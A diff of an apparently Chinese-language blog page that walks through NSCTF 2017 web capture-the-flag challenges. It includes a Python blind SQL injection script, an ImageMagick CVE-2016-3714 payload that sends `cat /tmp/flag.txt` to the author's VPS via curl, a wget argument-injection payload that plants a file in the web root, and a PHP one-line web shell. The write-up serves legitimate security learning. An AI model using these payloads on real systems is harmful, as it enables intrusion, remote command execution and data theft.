@@ -45,7 +45,7 @@
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-02.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-09.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-16.jpg">
-<meta property="og:updated_time" content="2017-09-27T10:08:48.081Z">
+<meta property="og:updated_time" content="2017-09-27T10:14:36.672Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NSCTF-Web-WriteUp">
 <meta name="twitter:description" content="Web-writeup1.web签到题">
@@ -230,8 +230,7 @@
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-42.jpg" alt="16-24-42.jpg" title="">
 <p>经过试验，后缀名过滤了php，文件内容过滤了&lt;?php等关键字。<br>后缀名可以用.phtml绕过，内容使用<script language="”php”">code</script>绕过<br>上传成功后访问你上传的木马就会得到flag</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-47.jpg" alt="16-24-47.jpg" title="">
-<p>5.web6-Vulhub</p>
-<img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-53.jpg" alt="16-24-53.jpg" title="">
+<h2 id="5-web6-Vulhub"><a href="#5-web6-Vulhub" class="headerlink" title="5.web6-Vulhub"></a>5.web6-Vulhub</h2><img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-53.jpg" alt="16-24-53.jpg" title="">
 <p>题目一开始给的范围有点大，一开始看到留言，以为XSS，看到提示url_include_open=on，以为文件包含，通过about页面的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?f=php://filter/read=convert.base64-encode/resource=xxx.php</div></pre></td></tr></table></figure></p>
 <p>就会得到base64编码后的xxx.php的源码。</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-57.png" alt="16-24-57.png" title="">
@@ -242,8 +241,10 @@
 <p>随找注入点。<br>留言的地方发留言用burp截断之后，response返回的是一串sql语句+username。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> XXX <span class="keyword">SET</span>(username,<span class="keyword">content</span>,<span class="keyword">data</span>) <span class="keyword">VALUES</span> (‘xxx’,’xxx’,<span class="keyword">now</span>())</div></pre></td></tr></table></figure></p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-13.png" alt="16-25-13.png" title="">
 <p>这个地方这么明显的提示，当然是注入啊。。。<br>发现username和content都是有addslashes()转义的。我还以为有什么神操作可以绕过，一直在这耗，毕竟提示都打印sql语句了。最后还是没得办法，2333<br>最后发现这是个坑，真正的注入点是一个search留言的get参数，欲哭无泪。<br>最后用盲注高出flag了<br>POC 如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,re</div><div class="line">url = <span class="string">"http://116.62.63.190:8002/ee00f46afe33f2ff/web6//search.php?search=a"</span></div><div class="line"><span class="comment"># 5'or%20ord(substr((Select%0bcolumncolumn_name_name%20%0bfromfrom%20%20informatioinformation_schema.columnsn_schema.columns%20%20wherewhere%20%0btable_name='flag'%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%20or%20'1'='0</span></div><div class="line"><span class="comment"># payload="5'or%20ord(substr((/*!50000Select*/%0bflag%20from%20web1.flag%20%20where%201%0b%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%20or%20'1'='0"</span></div><div class="line">payload = <span class="string">"'or%20ord(substr((/*!50000Select*/%0badmin_pass%20from%20ctf4.admin%20where%201%20limit%20&#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125;%23"</span></div><div class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">64</span>]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">100</span>):</div><div class="line">    str=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">100</span>):</div><div class="line">        num=<span class="number">0</span></div><div class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> l:</div><div class="line">            html = requests.get(url+payload.format(i,j,t)).text</div><div class="line">            <span class="keyword">if</span> <span class="string">"111111"</span> <span class="keyword">in</span> html:</div><div class="line">                num+=t</div><div class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        str+=chr(num)</div><div class="line">        <span class="keyword">print</span> str+<span class="string">"_"</span></div><div class="line">    <span class="keyword">print</span> str</div><div class="line">    <span class="keyword">if</span> str==<span class="string">""</span>:</div><div class="line">        <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> <span class="string">"============================"</span></div><div class="line"><span class="keyword">print</span> <span class="string">"End"</span></div></pre></td></tr></table></figure></p>
-<p>本题总结：可以找到的切入点太多（坑太多），混淆视听，实际考察的东西却过于简单，可能是我想太多了吧2333</p>
-<p>6.web7-imagemagick<br>500分的题目，还是挺有难度的，考查的是一个去年的imagemagick远程执行漏洞（CVE-2016-3714）<br>freebuf上有分析<a href="http://www.freebuf.com/vuls/103504.html" target="_blank" rel="external">http://www.freebuf.com/vuls/103504.html</a></p>
+<h3 id="本题总结："><a href="#本题总结：" class="headerlink" title="本题总结："></a>本题总结：</h3><blockquote>
+<p>可以找到的切入点太多（坑太多），混淆视听，实际考察的东西却过于简单，可能是我想太多了吧2333</p>
+</blockquote>
+<h2 id="6-web7-imagemagick"><a href="#6-web7-imagemagick" class="headerlink" title="6.web7-imagemagick"></a>6.web7-imagemagick</h2><p>500分的题目，还是挺有难度的，考查的是一个去年的imagemagick远程执行漏洞（CVE-2016-3714）<br>freebuf上有分析<a href="http://www.freebuf.com/vuls/103504.html" target="_blank" rel="external">http://www.freebuf.com/vuls/103504.html</a></p>
 <p>一开始没给提示，然后给个phpinfo，然后下午不知道什么时候再给了一个图片才知道是这个漏洞。。（出题人也是无力吐槽，各种改题不提示，环境还迟迟未搭建好）</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-45.jpg" alt="16-25-45.jpg" title="">
 <p>网上查到exploit，</p>
@@ -258,8 +259,10 @@
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-26-42.jpg" alt="16-26-42.jpg" title="">
 <p>随后<br>fill ‘url(<a href="https://www.baidu.com/img/bd_logo1.png&quot;|curl" target="_blank" rel="external">https://www.baidu.com/img/bd_logo1.png&quot;|curl</a> –cookie \”name=<code>cat /tmp/flag.txt</code>\” <a href="http://我的vps" target="_blank" rel="external">http://我的vps</a> IP:2502  “)’</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-27-13.jpg" alt="16-27-13.jpg" title="">
-<h3 id="本题总结："><a href="#本题总结：" class="headerlink" title="本题总结："></a>本题总结：</h3><p>由于本人开始写exploit的时候忽略了一些细节，导致cookie传不出来，也想不到其他传出命令执行结果的方法，故在比赛结束后几分钟才解得flag，丢失了500分,贼气。说明还是得熟悉linux操作、提升漏洞复现，随机应变的能力。</p>
-<p>7.web8-Git泄露<br>说是送分题，其实也拖了挺久时间的。。。也许因为太菜吧</p>
+<h3 id="本题总结：-1"><a href="#本题总结：-1" class="headerlink" title="本题总结："></a>本题总结：</h3><blockquote>
+<p>由于本人开始写exploit的时候忽略了一些细节，导致cookie传不出来，也想不到其他传出命令执行结果的方法，故在比赛结束后几分钟才解得flag，丢失了500分,贼气。说明还是得<br>熟悉linux操作、提升漏洞复现，随机应变的能力。</p>
+</blockquote>
+<h2 id="7-web8-Git泄露"><a href="#7-web8-Git泄露" class="headerlink" title="7.web8-Git泄露"></a>7.web8-Git泄露</h2><p>说是送分题，其实也拖了挺久时间的。。。也许因为太菜吧</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-28-52.jpg" alt="16-28-52.jpg" title="">
 <p>进去提示url=git<br>但是修改url，没有任何反应<br>可能这就是传说中的提示吧</p>
 <p>用Githack扫一下地址就能得到flag了</p>
@@ -267,7 +270,7 @@
 <p>打开83c0eb95cf761515fe09c2ad39527a39.txt</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-10.jpg" alt="16-29-10.jpg" title="">Base64解得:<br><br><img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-43.png" alt="16-29-43.png" title="">
 <p><strong>flag:{86045abb89db3e841f68593e3ecb7993}</strong></p>
-<p>8.web9-Wget<br>比赛的时候没有做出来这道题，比赛后才知道这种思路。<br>一开始以为绕过wget命令，因为是批量下载，没有绕过。<br>发现可以用wget的参数-P指定目录-O指定文件名字<br>但是随便输入一个地址会发现Permission Denied </p>
+<h2 id="8-web9-Wget"><a href="#8-web9-Wget" class="headerlink" title="8.web9-Wget"></a>8.web9-Wget</h2><p>比赛的时候没有做出来这道题，比赛后才知道这种思路。<br>一开始以为绕过wget命令，因为是批量下载，没有绕过。<br>发现可以用wget的参数-P指定目录-O指定文件名字<br>但是随便输入一个地址会发现Permission Denied </p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-53.png" alt="16-29-53.png" title="">
 <p>说明当前目录不可写<br>然后我就搁置在这了，主要是源码注释里面存在一个admin.php<br>一直在想这个admin.php有啥用</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-30-25.jpg" alt="16-30-25.jpg" title="">
@@ -276,10 +279,11 @@
 <p>接着目录不可写，发现上上级目录/var/www/html是可写的<br>Payload为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-P /var/www/haml -O+/var/www/html/wz.php http://我的VPS/code.txt</div></pre></td></tr></table></figure></p>
 <p>会发现已经写入</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-02.jpg" alt="16-32-02.jpg" title="">
-<p>我的VPS上的Code.txt的内容是一个一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">My code</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">System($_POST[“code”]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>我的VPS上的Code.txt的内容是一个一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">My code</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">System($_POST[“code”]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>随后访问<a href="http://116.62.63.190:8005/wz.php，发现一句话已经写入了" target="_blank" rel="external">http://116.62.63.190:8005/wz.php，发现一句话已经写入了</a></p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-09.jpg" alt="16-32-09.jpg" title="">
-<p>接着就是找flag了。<br>最后在/var/www/html/4b0cf03220fefbf6/web9/flag.php下找到flag</p>
+<p>接着就是找flag了。<br>最后在<strong>/var/www/html/4b0cf03220fefbf6/web9/flag.php</strong>下找到flag</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-32-16.jpg" alt="16-32-16.jpg" title="">
 <h1 id="Web题结束"><a href="#Web题结束" class="headerlink" title="Web题结束"></a>Web题结束</h1>
       
